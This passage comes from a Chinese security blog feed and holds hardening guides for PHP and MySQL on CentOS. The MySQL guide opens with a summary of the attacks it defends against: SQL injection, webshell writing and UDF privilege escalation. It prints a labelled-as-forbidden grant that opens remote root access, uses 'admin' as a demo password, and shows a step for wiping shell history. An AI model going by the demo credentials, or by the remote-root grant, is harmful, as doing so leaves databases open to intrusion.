允许上传文件的文件大小最大为多少 </span><br><span class="line">post_max_size = 8M# 通过POST表单给php的所能接收的文件大小最多为多少</span><br></pre></td></tr></table></figure></p><p>0x07 利用 <code>chattr</code> 锁定一些不需要经常改动的重要配置文件,如,php-fpm.conf,php.ini,my.cnf…,为了防止chattr工具被别人滥用,你可以把它改名隐藏到系统的某个角落里,用的时候再拿出来</p><p>锁定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># chattr +i /usr/local/php/etc/php.ini</span><br><span class="line"># chattr +i /usr/local/php/etc/php-fpm.conf</span><br><span class="line"># chattr +i /etc/my.cnf</span><br></pre></td></tr></table></figure></p><p>解锁<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># chattr -i /usr/local/php/etc/php.ini</span><br><span class="line"># chattr -i /usr/local/php/etc/php-fpm.conf</span><br><span class="line"># chattr -i /etc/my.cnf</span><br></pre></td></tr></table></figure></p><p>0x08 务必勤于关注php官方的高危补丁发布及说明,和其它工具不同,php 自身bug多,因为关注的人多,搞的人也多,所以暴露出来的各种安全问题也就更多</p><p>0x09 最后,告诉大家一个怎么把曾经yum下来的包保留着的办法,在系统断网的情况下也许用的着,只需到yum配置里面去调整下即可,保留的包的路径也在yum配置中定义好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/yum.conf</span><br><span class="line">  keepcache=1</span><br></pre></td></tr></table></figure></p><p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;至此为止,关于<code>整套LNMP架构</code>的安全部署及优化,也就差不多完成了,我们关注的点,更多可能还是集中在防御入侵上,捎带了一点性能优化,这里所给的参数选项基本全部都可直接用于实战部署,但并不是所有的参数配置都是必须的,还需要你好好根据自己实际的业务需求做出适当取舍,或者在此基础进行定制改进,有些地方都是基于自己平时实战经验的考量来的,并不一定完全是对的,如果有性能更好,更安全的方案,也非常欢迎大家一起来私信交流 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 php&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;其历史相对已经比较久远了,这里也就不废话了,属弱类型中一种解释型语言&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;除了web开发以及写些简单的exp,暂未发现其它牛逼用途,暂以中小型web站点开发为主&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;另外,低版本的php自身漏洞就比较多,建议,从现在开始就在新项目中使用php 5.6.x 往后的版本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;好在官方维护的一直比较勤奋,主次版本都迭代的比较快,最新版已经到7.2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;哼哼……是,&amp;apos;最好的语言&amp;apos;... :)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 此次演示环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CentOS6.8 x86_64   最小化,带基础库安装 	eth0: 192.168.3.42 eth1: 192.168.4.14  eth2: 192.168.5.14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;php-5.6.32.tar.gz  官方提供的源码包&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 下载 &lt;code&gt;php-5.6.32.tar.gz&lt;/code&gt;,并安装好php所需的各种依赖库&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# yum install epel-release -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# yum install -y zlib-devel libxml2-devel freetype-devel &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# yum install -y libjpeg-devel  libpng-devel gd-devel curl-devel libxslt-devel&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# yum install openssl openssl-devel libmcrypt libmcrypt-devel mcrypt mhash mhash-devel -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# tar xf libiconv-1.15.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# cd libiconv-1.15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ./configure --prefix=/usr/local/libiconv-1.15 &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ln -s /usr/local/libiconv-1.15/ /usr/local/libiconv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ll /usr/local/libiconv/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="phpsec" scheme="https://evil-404.github.io/categories/phpsec/"/>
    
    
      <category term="phpsec" scheme="https://evil-404.github.io/tags/phpsec/"/>
    
  </entry>
  
  <entry>
    <title>给自己一个更安全的 mysql</title>
    <link href="https://evil-404.github.io/2017-11-23-mysqlconfigsec.html"/>
    <id>https://evil-404.github.io/2017-11-23-mysqlconfigsec.html</id>
    <published>2017-11-22T20:09:17.000Z</published>
    <updated>2017-12-05T11:32:06.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 在进行真正的 mysql 部署之前,我们不妨先来大致了解下,在实际入侵过程中,仅仅利用mysql,我们到底能干些什么,了解了这些最基本的点之后,我们再进行针对性防御:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">普通用户权限下的 &apos;增删改查&apos;,即 常规sql注入,俗称&apos;脱裤&apos;</span><br><span class="line">普通用户file权限下的 &apos;文件读写&apos;,可尝试读取各类敏感配置,如各类账号或者尝试直接往站点目录中写webshell</span><br><span class="line">root用户权限下的 &apos;读写文件&apos; , &apos;系统命令执行&apos;... 可读写是因为root本身就有file权限,另外,如果直接以root身份运行mysql服务,亦可实现&apos;提权&apos;的效果</span><br><span class="line">针对 &apos;数据库连接&apos; 的&apos;DDOS&apos;,单用户大批量数据库连接可能会导致mysql无法再提供服务</span><br></pre></td></tr></table></figure></p><p>0x02 演示环境:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.8 x86_64 最小化,只带基础库安装  eth0: 192.168.3.42 eth1: 192.168.4.14  eth2: 192.168.5.14</span><br><span class="line">mysql-5.6.27-linux-glibc2.5-x86_64.tar.gz  此次mysql就不再手工编译了,时间比较长,直接用mysql官方提供好的二进制包来做演示</span><br></pre></td></tr></table></figure></p><p>0x03 下载,解压 mysql-5.6.27-linux-glibc2.5-x86_64.tar.gz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># tar xf mysql-5.6.27-linux-glibc2.5-x86_64.tar.gz</span><br><span class="line"># mv mysql-5.6.27-linux-glibc2.5-x86_64 /usr/local/</span><br><span class="line"># ln -s /usr/local/mysql-5.6.27-linux-glibc2.5-x86_64/ /usr/local/mysql</span><br><span class="line"># ls -l /usr/local/mysql/</span><br></pre></td></tr></table></figure></p><p>0x04 开始初始化mysql</p><p>务必以一个伪用户身份来运行mysql服务,防止别人利用mysql进行提权,后面还会再细说,另外,web服务和数据库服务严禁用同一个系统用户,这样做主要是为了防止入侵者直接通过sql语句往网站目录中写webshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># useradd -s /sbin/nologin -M mysql</span><br></pre></td></tr></table></figure></p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># chown -R mysql.mysql /usr/local/mysql/ &amp;&amp; ll /usr/local/mysql/   暂时先让mysql用户对mysql的安装目录能正常读写</span><br><span class="line"># /usr/local/mysql/scripts/mysql_install_db --basedir=/usr/local/mysql/ --datadir=/usr/local/mysql/data/ --user=mysql</span><br><span class="line"># chown -R root.root /usr/local/mysql/ &amp;&amp; ll /usr/local/mysql/</span><br><span class="line"># chown -R mysql.mysql /usr/local/mysql/data/ &amp;&amp; ll /usr/local/mysql/data/</span><br><span class="line"># cp /usr/local/mysql/support-files/my-default.cnf /etc/my.cnf   创建mysql配置文件</span><br><span class="line"># /usr/local/mysql/bin/mysqld_safe &amp;   启动mysql服务</span><br></pre></td></tr></table></figure><p>把mysql工具包加到root用户的环境变量中,方便后续使用,切记不要放到全局环境变量下,那意思就是说当前系统所有普通用户也都可以使用mysql工具套件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># echo &quot;export PATH=$PATH:/usr/local/mysql/bin/&quot; &gt;&gt; .bash_profile</span><br><span class="line"># source .bash_profile</span><br><span class="line"># mysql</span><br><span class="line"># killall mysqld</span><br></pre></td></tr></table></figure></p><p>0x05 让 mysql 随系统自启动的两种方式,更推荐前者,实际中大家可根据个人习惯而定:</p><p>第一种:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo &quot;/usr/local/mysql/bin/mysqld_safe &amp;&quot; &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure></p><p>第二种:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld</span><br><span class="line"># chmod +x /etc/init.d/mysqld</span><br><span class="line"># ll /etc/init.d/mysqld</span><br><span class="line"># /etc/init.d/mysqld start</span><br><span class="line"># lsof -i :3306</span><br><span class="line"># /etc/init.d/mysqld stop</span><br></pre></td></tr></table></figure></p><p>0x06 mysql初始化后的基础配置:</p><p>设置复杂root密码,关于密码安全在之前已无数次强调,此处就不细说了吧,<code>同时包含大小写,特殊字符,12位以上的随机密码</code>,越随机越好,这里纯粹只是为了演示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /etc/init.d/mysqld start</span><br><span class="line"># mysqladmin -uroot password &quot;admin&quot;</span><br></pre></td></tr></table></figure></p><p>设置好root密码后,立刻进到mysql下,删除多余数据库,如,test库…,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># mysql -uroot -p</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; drop database test;</span><br></pre></td></tr></table></figure></p><p>清除多余数据库用户,只保留<code>root</code>的<code>localhost</code>和<code>127.0.0.1</code>即可,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,host from mysql.user;</span><br><span class="line">+------+-----------+</span><br><span class="line">| user | host      |</span><br><span class="line">+------+-----------+</span><br><span class="line">| root | 127.0.0.1 |</span><br><span class="line">| root | ::1       |</span><br><span class="line">|      | localhost |</span><br><span class="line">| root | localhost |</span><br><span class="line">|      | oldlnmp   |</span><br><span class="line">| root | oldlnmp   |</span><br><span class="line">+------+-----------+</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop user &apos;&apos;@&apos;localhost&apos;;</span><br><span class="line">mysql&gt; drop user &apos;&apos;@&apos;oldlnmp&apos;;</span><br><span class="line">mysql&gt; drop user &apos;root&apos;@&apos;oldlnmp&apos;;</span><br><span class="line">mysql&gt; drop user &apos;root&apos;@&apos;::1&apos;;</span><br><span class="line"></span><br><span class="line">mysql&gt; select user,host from mysql.user;</span><br><span class="line">+------+-----------+</span><br><span class="line">| user | host      |</span><br><span class="line">+------+-----------+</span><br><span class="line">| root | 127.0.0.1 |</span><br><span class="line">| root | localhost |</span><br><span class="line">+------+-----------+</span><br></pre></td></tr></table></figure><p>0x07 从根源上限制住 mysql 在系统中的各种权限  <code>[ 暂以防止服务器被入侵为最终目的,此处是防不住别人正常的增删改查的,如,&#39;脱裤&#39; ]</code></p><p>首先,尽可能让<code>mysql服务</code>运行在一个较低的系统权限下,防止别人利用该服务提权,如,常见的<code>udf提权</code>,这里有些朋友可能会误解,以为只能要能执行系统命令,就是提权,其实不然,在linux中,普通用户也一样可以执行大部分系统命令,但,它依然只是个普通用户,提权的意思就是让你从一个普通用户甚至是一个伪用户身份的权限下直接提升到了root权限,言归正传,因为我们当前运行mysql服务的用户只是一个系统伪用户,也就是说,你当前运行任何sql语句所映射的权限,都是你mysql服务用户的权限,如果这个服务用户权限本身就很低,也一样达不到提权的效果,相对来讲,udf提权更适合用在一些比较古老的系统<code>&lt;= win2003</code>和较低的一些mysql版本上<code>&lt;= mysql 5.1</code>,新版的mysql除了性能优化之外,安全性也有大幅提升,话说回来,即使安全性提升了,也还是保不住傻逼的配置,之前在win平台下,也许还可以想办法通过dll劫持的方式来进行提权,但5.6.x已经很好的修复了这些问题,对进程的安全上下文也做了更为严格的控制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># useradd -s /sbin/nologin -M mysql</span><br></pre></td></tr></table></figure></p><p>严格控制住mysql安装目录在<code>本地文件系统</code>中的权限,我们再来简单回顾一下上面初始化mysql的详细过程,如下,在初始化之前,首先,我们创建了一个系统伪用户mysql,接着我们把mysql安装目录的属主,属组都改成了mysql,意思就是先让mysql用户对mysql的安装目录暂时能写,因为等会儿要初始化mysql,会生成一些mysql内部系统配置,比如,mysql系统库,所以,必须要让mysql用户对mysql的安装目录能写才行,紧接着,我们指定了mysql的安装目录和数据存放目录,以及运行mysql服务时的系统用户 <code>[ 即mysql用户 ]</code>,尝试进行初始化操作,这里务必注意,在第一次初始化完成后,我们后续的权限就不需要那么大了,所以,又把mysql安装目录的属主,属组都改成了root,因为最终还要保证别人能正常的往数据库中写数据,所以,data目录的属主要再改回mysql,说到这份上,想必大家此时都已经非常清晰了吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># chown -R mysql.mysql /usr/local/mysql/ &amp;&amp; ll /usr/local/mysql/</span><br><span class="line"># /usr/local/mysql/scripts/mysql_install_db --basedir=/usr/local/mysql/ --datadir=/usr/local/mysql/data/ --user=mysql</span><br><span class="line"># chown -R root.root /usr/local/mysql/ &amp;&amp; ll /usr/local/mysql/</span><br><span class="line"># chown -R mysql /usr/local/mysql/data/ &amp;&amp; ll /usr/local/mysql/data/</span><br></pre></td></tr></table></figure></p><p>0x08 关于 mysql自身的一些安全配置</p><p>在通过上面的一些初步加固后,别人此时再想单单通过mysql拿到服务器权限就比较困难了,毕竟,是从根源上进行控制的,下面我们就再来对针对mysql自身配置做些简要优化</p><p>为每个站点,创建独立的数据库以及数据库用户,只允许该用户对该库有最基本的增删改查权限且只能让特定的内网ip才能访问到,有条件,最好站库进行分离,分离的好处在于可以让入侵者无法再正常读写文件,毕竟不在同一台机器上,因为数据库服务器上,根本没有web服务,即使侥幸找到了物理路径,也没啥大用,此外,要严格遵守密码复杂性要求,其实,实际生产环境中,这些权限已经基本能够适应所有日常业务需求,别的权限一律不要加,另外,在授权时,也可通过shell脚本自动对指定库中除管理或系统表之外的其它表进行一一单独授权,而管理表则单独授权给其它数据库用户,这样做的好处就是,此时即使存在sql注入,也让入侵者没法通过跨表来查网站后台管理的账号和密码hash,有些权限对普通用户来讲是完全没必要的,如,file,如果让普通用户都有file权限,也就意味着入侵者可以通过mysql往你服务器本地文件系统中读写文件,虽然,我们是可以对本地文件系统进行详细权限控制,但还是会造成一部分信息泄露,毕竟有些权限,我们是不太好动的,比如,/tmp下,所以,这些危险权限统统的不要,当然,一些非常重要的业务数据表,也可以单独授权给另一个用户进行相互隔离,如果业务逻辑比较复杂,这样做确实麻烦,可以尝试慢慢把业务整理拆分出来,虽然,我们可以利用mysql轻松把权限控制到表级别,但实际中还是非常建议’一站一库’,这样后续维护管理起来也非常方便规整<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database sec_list;</span><br><span class="line">mysql&gt; create user &apos;klion&apos;@&apos;192.168.3.70&apos; identified by &apos;admin&apos;;</span><br><span class="line">mysql&gt; create user &apos;sec&apos;@&apos;192.168.3.70&apos; identified by &apos;admin&apos;;</span><br><span class="line">mysql&gt; grant insert,delete,update,select,create,drop on sec_list.* to klion@&apos;192.168.3.70&apos; identified by &apos;admin&apos;;</span><br><span class="line">mysql&gt; grant insert,delete,update,select,create,drop on sec_list.admin to sec@&apos;192.168.3.70&apos; identified by &apos;admin&apos;;</span><br><span class="line">mysql&gt; flush  privileges;</span><br><span class="line">mysql&gt; show grants for &apos;klion&apos;@&apos;192.168.3.70&apos;;查询指定数据库用户的系统权限</span><br><span class="line">mysql&gt; revoke select on sec_list.* from &apos;sec&apos;@&apos;192.168.3.70&apos;;撤销指定用户的指定权限</span><br></pre></td></tr></table></figure></p><p>严禁允许root用户外连,正常来讲,不仅仅是root不允许外连,有条件的情况下,mysql服务端口都不要对外开放,只允许特定的内网ip段来连接,另外,所有的实际业务严禁直接用mysql的root用户身份来处理,强烈建议,不同的业务需求,直接创建对应的数据库普通账户来处理即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; grant all on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;admin&apos; with grant option;flush privileges;严禁用语句对root重新授权</span><br></pre></td></tr></table></figure></p><p>把root用户改个比较另类的名字,越看不出来是干啥的越好,嘿嘿……说实话个人觉得没啥用,如果真的存在sql注入,随便用sql语句查下权限就知道了,另外,sqlmap里的–is-dba也不是白给的,不过这样做的好处,倒是可以一定程度上防爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user set user=&apos;root&apos; where user=&apos;guest&apos;;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure></p><p>至于修改端口,其实,也没啥大用,通过各种服务指纹识别及端口扫描工具依然可以快速探测出来,即使一下扫65535个端口,现在对nmap来讲也并不是太慢,修改端口的方法比较简单,只需要改下mysql配置文件mysqld模块下port字段即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/my.cnf</span><br></pre></td></tr></table></figure></p><p>0x09 定时远程同步 mysql 服务的各类日志,方便后续审查日志快速匹配出里面的各种sql注入攻击特征,如,information便是非常好的关键字,观察哪些是执行成功的,尽可能回溯到可能存在sql注入的脚本代码段,并主动修复该漏洞,生产环境中的mysql可能瞬间并发都很高,如果此时再启用查询日志,数据库的压力可想而知,所以,适时取舍<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /usr/local/mysql/data/OldLnmp.err</span><br><span class="line">mysql&gt; show variables like &apos;log_%&apos;;  查看各类日志存放位置和开启情况</span><br></pre></td></tr></table></figure></p><p>0x10 利用各种实时日志分析平台,实时快速捕捉各种常见数据库攻击特征,如,ELK,Splunk…目前还在研究学习中,离实战应用还有些距离,欠着,待续…</p><p>0x11 注意对重要业务数据定时备份,这些不用说,想必大家也很清楚,相信绝大部分都早已主从同步了</p><p>0x12 限制单用户连接数,防止拒绝服务</p><p>0x13 这可能也是我们对mysql的最后一道补救防线,删除各种历史文件,如下,其实说白点,既然能到这一步,说明别人此时已经拿到shell了,这样做也纯粹是自我安慰罢了,只能说让入侵者尽量搜集不到什么有价值的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># history -w  先把当前所有的历史记录写到命令历史文件中去</span><br><span class="line"># vi .bash_history  然后编辑该文件,把里面所有的关于mysql的操作全部删除</span><br><span class="line"># history -w &amp;&amp; history  最后,再更新文件,看看刚刚删掉的那些记录还在不在</span><br><span class="line"># rm -fr .mysql_history  删掉mysql操作历史</span><br></pre></td></tr></table></figure></p><p>0x16 最后,定期去关注mysql官方发布的高危补丁,适时进行修补</p><p>0x17 关于sql注入各种利用,属于脚本漏洞范畴,并不在今天的讨论范围内,对此,后续还会有大量详细的说明,此处不再赘述</p><p>0x10 利用各类入侵检测系统,自动检测识别恶意脱裤流量,暂时还没啥特别好的思路,也非常期待能和大家一起多交流</p><p>0x18 更多,待续…</p><p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;还是那句话,此处所说的一切加固,全部是建立在确认自己目前<code>还没被别人成功入侵</code>或者别人<code>手里没有可用远程0day</code>的情况下,如果是这样,刚才说的这些,就差不多已经能把mysql整个权限牢牢的控死在摇篮里,另外,还有一些边缘性的无关痛痒的安全配置,单从入侵的角度来讲,那些并不重要,所以就没仔细说,个人性格比较鲜明,从写文章的风格大家也隐约能感觉到,哼哼…一刀毙敌惯了,不太喜欢废话,话不在多,点中即可,毕竟,<code>我们不是在做学术研究,而是贴近实战,真刀真枪的干</code>,另外,不要问我为什么不把mysql部署在windows上,是的,我承认自己对windows掌握的并不好 [ 除了域,如果你认为只是点点图形界面上的按钮就叫会了,那我无话可说,如果都这么简单,那就不叫<code>操作系统</code>了,叫玩具也许会更合适些 ],可能跟大家不太一样的是,因为各种阴差阳错的原因,自己真正的启蒙操作系统是linux<code>[ 哈哈,没接受过大学正规教育的悲哀 ]</code>,不过,这也让我对整个操作系统有了自己的理解和认识,相信用linux的思维方式来思考问题,你会看到另一个世界,<code>简洁,高效,可控而美丽</code>,哼哼,反正,对于linux真心觉得越用越觉得好用,等你用到一定程度,你就会感觉到,它对你几乎是完全透明的,有着非常强的把控感,而windows给自己的感觉则是无尽的恐怖与未知,大家可能也看出来了,和传统的安全运维不太一样,我们更加专注于防入侵,说心里话,如果你对系统的权限分配机制<code>专业叫法 [ 安全上下文 ]</code>已经理解的非常透彻了,毫不夸张的说,这些东西对你来讲,简直易如反掌,真的,当然,这里所说的简单,并非指那些所谓的命令工具,而是你可以根据自己实际的业务需求,进行更加合理灵活的权限控制,另外,丰富的实战渗透经验也是必不可少的,说一千道一万,很多问题,如果当初就严格按照安全规范来操作是很难出什么问题的,<code>一切还以实际业务需求和性能为主</code>,不多说了,祝大家好运吧 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 在进行真正的 mysql 部署之前,我们不妨先来大致了解下,在实际入侵过程中,仅仅利用mysql,我们到底能干些什么,了解了这些最基本的点之后,我们再进行针对性防御:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;普通用户权限下的 &amp;apos;增删改查&amp;apos;,即 常规sql注入,俗称&amp;apos;脱裤&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;普通用户file权限下的 &amp;apos;文件读写&amp;apos;,可尝试读取各类敏感配置,如各类账号或者尝试直接往站点目录中写webshell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;root用户权限下的 &amp;apos;读写文件&amp;apos; , &amp;apos;系统命令执行&amp;apos;... 可读写是因为root本身就有file权限,另外,如果直接以root身份运行mysql服务,亦可实现&amp;apos;提权&amp;apos;的效果&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;针对 &amp;apos;数据库连接&amp;apos; 的&amp;apos;DDOS&amp;apos;,单用户大批量数据库连接可能会导致mysql无法再提供服务&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 演示环境:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CentOS6.8 x86_64 最小化,只带基础库安装  eth0: 192.168.3.42 eth1: 192.168.4.14  eth2: 192.168.5.14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mysql-5.6.27-linux-glibc2.5-x86_64.tar.gz  此次mysql就不再手工编译了,时间比较长,直接用mysql官方提供好的二进制包来做演示&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
